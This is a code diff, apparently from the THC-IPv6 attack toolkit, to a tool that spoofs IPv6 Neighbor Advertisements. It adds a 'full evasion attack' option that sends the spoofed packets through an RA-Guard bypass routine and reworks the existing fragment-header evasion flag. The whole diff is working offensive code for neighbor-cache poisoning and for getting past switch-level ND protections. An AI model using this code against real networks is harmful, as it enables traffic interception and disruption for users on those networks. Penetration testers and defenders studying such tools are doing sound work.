@@ -25,8 +25,9 @@ void help(char *prg) {
   printf("  -r  DO set the router flag (default: off)\n");
   printf("  -s  DO set the solicitate flag (default: off)\n");
   printf("ND Security evasion options (can be combined):\n");
+  printf("  -F  full evasion attack (no other evasion options allowed)\n");
   printf("  -H  add a hop-by-hop header\n");
-  printf("  -F  add a one shot fragment header (can be specified multiple times)\n");
+  printf("  -f  add a one shot fragment header (can be specified multiple times)\n");
   printf("  -D  add a large destination header which fragments the packet.\n");
   exit(-1);
 }
@@ -34,7 +35,7 @@ void help(char *prg) {
 int main(int argc, char *argv[]) {
   unsigned char *pkt1 = NULL, *pkt2 = NULL, buf[24], buf2[6], buf3[1500];
   unsigned char *unicast6, *src6 = NULL, *dst6 = NULL, srcmac[8] = "", replymac[8] = "", *mac = replymac, *smac = NULL;
-  int pkt1_len = 0, pkt2_len = 0, prefer = PREFER_GLOBAL, i, do_hop = 0, do_dst = 0, do_frag = 0, cnt, type = NXT_ICMP6, wait = 5, loop = -1;
+  int pkt1_len = 0, pkt2_len = 0, prefer = PREFER_GLOBAL, i, do_hop = 0, do_dst = 0, do_frag = 0, cnt, type = NXT_ICMP6, wait = 5, loop = -1, do_full = 0;
   unsigned int flags = ICMP6_NEIGHBORADV_OVERRIDE;
   char *interface;
   int offset = 14;
@@ -45,7 +46,7 @@ int main(int argc, char *argv[]) {
 
   if (getenv("THC_IPV6_PPPOE") != NULL || getenv("THC_IPV6_6IN4") != NULL) printf("WARNING: %s is not working with injection!\n", argv[0]);
 
-  while ((i = getopt(argc, argv, "DFHOrsn:w:m:")) >= 0) {
+  while ((i = getopt(argc, argv, "DfFHOrsn:w:m:")) >= 0) {
     switch (i) {
     case 'n':
       loop = atoi(optarg);
@@ -68,11 +69,14 @@ int main(int argc, char *argv[]) {
     case 's':
       flags = (flags | ICMP6_NEIGHBORADV_SOLICIT);
       break;
-    case 'F':
+    case 'f':
       do_frag++;
       break;
     case 'H':
       do_hop = 1;
+      break;
+    case 'F':
+      do_full = 1;
       break;
     case 'D':
       do_dst = 1;
@@ -82,6 +86,9 @@ int main(int argc, char *argv[]) {
       exit(-1);
     }
   }
+
+  if (do_full)
+    do_hop = do_dst = do_frag = 0;
 
   if (argc - optind < 2)
     help(argv[0]);
@@ -176,7 +183,10 @@ int main(int argc, char *argv[]) {
 */
   printf("Starting advertisement of %s (Press Control-C to end)\n", argv[optind + 1]);
   while (loop) {
-    if (do_dst) {
+    if (do_full) {
+      hdr = (thc_ipv6_hdr *) pkt1;
+      thc_send_raguard_bypass6(interface, src6, dst6, smac, NULL, NXT_ICMP6, hdr->pkt + 40 + offset, hdr->pkt_len - 40 - offset, 0);
+    } else if (do_dst) {
       hdr = (thc_ipv6_hdr *) pkt1;
       thc_send_as_fragment6(interface, src6, dst6, type, hdr->pkt + 40 + offset, hdr->pkt_len - 40 - offset, 1240);
       hdr = (thc_ipv6_hdr *) pkt2;
